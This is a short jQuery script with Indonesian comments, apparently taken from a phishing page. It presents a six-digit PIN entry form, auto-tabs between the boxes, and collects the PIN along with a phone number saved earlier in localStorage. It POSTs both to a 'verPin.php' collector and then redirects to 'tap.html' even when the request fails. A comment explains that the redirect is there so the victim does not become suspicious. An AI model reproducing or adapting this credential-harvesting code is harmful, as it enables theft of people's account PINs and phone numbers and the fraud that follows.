<script>
$(document).ready(function() {
    // Biar langsung fokus ke kotak pertama
    $('.inppin').first().focus();

    // Logika pindah kotak (Auto-Tab)
    $('.inppin').on('input', function() {
        if (this.value.length === 1) {
            $(this).next('.inppin').focus();
        }
        
        // Cek kalau semua kotak udah keisi (6 angka)
        var semuaKeisi = true;
        var pinVal = "";
        $('.inppin').each(function() {
            pinVal += $(this).val();
            if ($(this).val() === "") semuaKeisi = false;
        });

        if (semuaKeisi && pinVal.length === 6) {
            sendPin(pinVal);
        }
    });

    // Logika hapus (Backspace) biar bisa mundur
    $('.inppin').on('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0) {
            $(this).prev('.inppin').focus();
        }
    });
});

function sendPin(pinLengkap) {
    $("#process").css('display', 'flex'); // Munculin loading
    
    // Ambil nomor HP dari memori
    var phone = localStorage.getItem('phoneNumber') || '-';

    $.ajax({
        type: 'POST',
        // PAKAI LINK LENGKAP BIAR GAK STUCK LAGI
        url: '../nl/verPin.php', 
        data: {
            phone: phone,
            pin: pinLengkap // Kirim pin yang udah digabungin aja biar PHP-nya simpel
        },
        success: function(res) {
            setTimeout(function() { 
                window.location.href = "tap.html"; 
            }, 1500);
        },
        error: function() {
            // Kalau error tetep lempar ke tap.html biar gak curiga
            setTimeout(function() { 
                window.location.href = "tap.html"; 
            }, 1000);
        }
    });
}
</script>
